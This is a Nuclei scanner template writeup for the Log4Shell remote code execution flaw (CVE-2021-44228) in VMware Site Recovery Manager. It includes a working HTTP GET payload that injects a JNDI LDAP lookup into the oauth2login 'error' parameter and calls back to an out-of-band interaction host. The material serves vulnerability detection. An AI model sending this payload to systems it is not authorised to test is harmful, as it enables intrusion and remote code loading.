# Nuclei Template: VMware Site Recovery Manager - Remote Code Execution (Apache Log4j)
**Template ID:** vmware-siterecovery-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`vmware-siterecovery-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
VMware Site Recovery Manager is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/dr/authentication/oauth2/oauth2login?error=$%7Bjndi%3Aldap%3A%2F%2F$%7B%3A-{{rand1}}%7D$%7B%3A-{{rand2}}%7D.$%7BhostName%7D.uri.{{interactsh-url}}%7D
```

## References
- https://www.horizon3.ai/the-long-tail-of-log4shell-exploitation/
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
